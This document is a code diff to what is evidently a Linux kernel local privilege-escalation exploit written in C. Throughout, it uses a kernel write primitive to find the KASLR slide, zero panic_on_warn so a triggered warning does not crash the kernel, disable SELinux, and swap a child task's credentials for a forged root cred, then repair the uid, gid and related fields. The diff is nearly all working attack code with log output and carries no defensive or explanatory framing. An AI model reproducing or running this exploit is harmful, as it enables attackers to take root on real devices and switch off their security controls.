@@ -1982,25 +1982,6 @@ int main(int argc, char **argv)
         }
         if (!r.ok)
             park_forever("no successful plant");
-
-        /* With g_slide now known, disable panic_on_warn and SELinux
-         * in the same exploit run so no second timer instance is needed. */
-        if (g_slide)
-        {
-            logf("[+] shell+seoff: slide=%#llx\n", g_slide);
-            if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
-                            "panic_on_warn", raw, NULL))
-                logf("[!] panic_on_warn write failed (continuing)\n");
-            else
-                logf("[+] panic_on_warn zeroed\n");
-            if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
-                            "selinux", raw, NULL))
-                logf("[!] selinux write failed (continuing)\n");
-            else
-                logf("[+] SELinux disabled\n");
-        }
-        else
-            logf("[!] no KASLR slide - skipping selinux/panic_on_warn\n");
     }
     else
     {
@@ -2009,17 +1990,29 @@ int main(int argc, char **argv)
         if (!g_child_task)
             park_forever("child task not leaked");
         memset(&fc, 0, sizeof(fc));
+
         /*
-         * The self-parent erase takes the RB_EMPTY_NODE WARN; the target
-         * kernel keeps panic_on_warn at 0.  The sysctl is only readable after
-         * SELinux is off, so the WARN cannot be gated before this plant.
+         * M08 (and similar) ships with panic_on_warn=1.  The mode-2 write
+         * (fake_cred) triggers an RB_EMPTY_NODE WARN in rb_erase, which
+         * panics the kernel unless panic_on_warn is zeroed first.
          *
-         * Point task->cred at the reclaimed page.  The fake cred starts at
-         * the stale node address; rb_erase dirties uid/gid with the target,
-         * so one zero write repairs them.  suid/sgid keep the rb_left
-         * target; the fake cred's full CAP_SETUID and euid 0 make that
-         * irrelevant for the fork/exec handoff.
+         * Strategy: use a mode-0 probe write (zero, no WARN) to discover
+         * the KASLR slide, then zero panic_on_warn, then proceed with
+         * the mode-2 fake_cred write safely.
          */
+        if (read_panic_on_warn() != 0) {
+            logf("[+] panic_on_warn=1, probe write to get KASLR slide...\n");
+            if (stage_write(R + CRED_UID_OFF, 0, "slide_probe", raw, NULL))
+                park_forever("slide probe failed");
+            if (!g_slide)
+                park_forever("no KASLR slide from probe");
+            logf("[+] KASLR slide=%#llx, zeroing panic_on_warn...\n", g_slide);
+            if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
+                            "panic_on_warn", raw, NULL))
+                park_forever("panic_on_warn write failed");
+            logf("[+] panic_on_warn zeroed, safe to do mode-2 write\n");
+        }
+
         if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                         raw, &fc))
             park_forever("fake cred write failed");
@@ -2030,15 +2023,26 @@ int main(int argc, char **argv)
         if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
                         "selinux", raw, NULL))
             park_forever("selinux write failed");
-        if (read_panic_on_warn() != 0 &&
-            stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
-                        "panic_on_warn", raw, NULL))
-            park_forever("panic_on_warn write failed");
         if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
             park_forever("fake uid fix failed");
         if (CRED_UID_OFF == 4 &&
             stage_write(fc.A + 0x14, 0, "fake_euid", raw, NULL))
             park_forever("fake euid fix failed");
+        /* suid/sgid (offsets 0x0c/0x10) hold stale rb_left pointers from
+         * rb_erase; zero them so the child doesn't panic on credential
+         * checks after wake-up. */
+        if (CRED_UID_OFF == 4)
+        {
+            if (stage_write(fc.A + 0x0c, 0, "fake_suid", raw, NULL))
+                logf("[!] suid fix failed (continuing)\n");
+            if (stage_write(fc.A + 0x10, 0, "fake_sgid", raw, NULL))
+                logf("[!] sgid fix failed (continuing)\n");
+            /* also zero gid (0x08) and egid (0x18) for clean cred */
+            if (stage_write(fc.A + 0x08, 0, "fake_gid", raw, NULL))
+                logf("[!] gid fix failed (continuing)\n");
+            if (stage_write(fc.A + 0x18, 0, "fake_egid", raw, NULL))
+                logf("[!] egid fix failed (continuing)\n");
+        }
     }
     logf("[+] cred writes landed, waking child\n");
 
